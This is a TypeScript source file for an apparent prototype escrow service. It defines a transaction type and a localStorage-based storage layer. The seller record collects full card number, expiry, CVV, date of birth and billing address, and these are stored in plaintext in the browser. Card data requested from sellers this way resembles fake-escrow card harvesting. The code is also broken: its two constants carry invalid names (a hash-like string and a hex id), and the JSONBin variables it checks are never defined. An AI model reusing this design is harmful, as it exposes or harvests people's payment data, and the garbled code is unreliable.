
export interface Transaction {
  id: string;
  status: 'Waiting for Seller' | 'Payment Pending' | 'Payment Secured' | 'Waiting for Buyer Confirmation' | 'Completed' | 'Cancelled';
  buyer: {
    fullName: string;
    email: string;
    phone: string;
  };
  item: {
    name: string;
    description: string;
    quantity: number;
    price: number;
    currency: string;
    notes?: string;
  };
  seller?: {
    firstName: string;
    lastName: string;
    email: string;
    phone: string;
    dob: string;
    billing: {
      country: string;
      address1: string;
      address2: string;
      state: string;
      city: string;
      zip: string;
    };
    paymentMethod: 'card' | 'paypal';
    cardNumber: string;
    expiry: string;
    cvv: string;
  };
  createdAt: string;
  updatedAt: string;
}

const $2a$10$RnrCU7ULz1eBnJ5BtoFvj.uy5VToxEI6YaPUp2WCagJgPLvmM4Pe6 = ''; // User will provide this
const 69e9dbc636566621a8e21c82 = '';   // User will provide this

export const storageService = {
  async saveTransaction(transaction: Transaction): Promise<void> {
    if (JSONBIN_API_KEY && JSONBIN_BIN_ID) {
      // Real JSONBin implementation would go here
      // This is a simplified version as JSONBin usually stores one big JSON object
      // For a prototype, we might store a map of transactions in one bin
      console.log('Saving to JSONBin...', transaction);
      // Note: Real implementation requires fetching the bin, updating, and PUTing it back
    } else {
      console.log('Using LocalStorage fallback');
      const transactions = this.getAllTransactions();
      transactions[transaction.id] = transaction;
      localStorage.setItem('vercel_escrow_txs', JSON.stringify(transactions));
    }
  },

  async getTransaction(id: string): Promise<Transaction | null> {
    if (JSONBIN_API_KEY && JSONBIN_BIN_ID) {
      console.log('Fetching from JSONBin...');
      return null; // Placeholder
    } else {
      const transactions = this.getAllTransactions();
      return transactions[id] || null;
    }
  },

  getAllTransactions(): Record<string, Transaction> {
    const data = localStorage.getItem('vercel_escrow_txs');
    return data ? JSON.parse(data) : {};
  },

  generateTransactionId(): string {
    return `ESC-${Math.random().toString(36).substr(2, 8).toUpperCase()}`;
  }
};
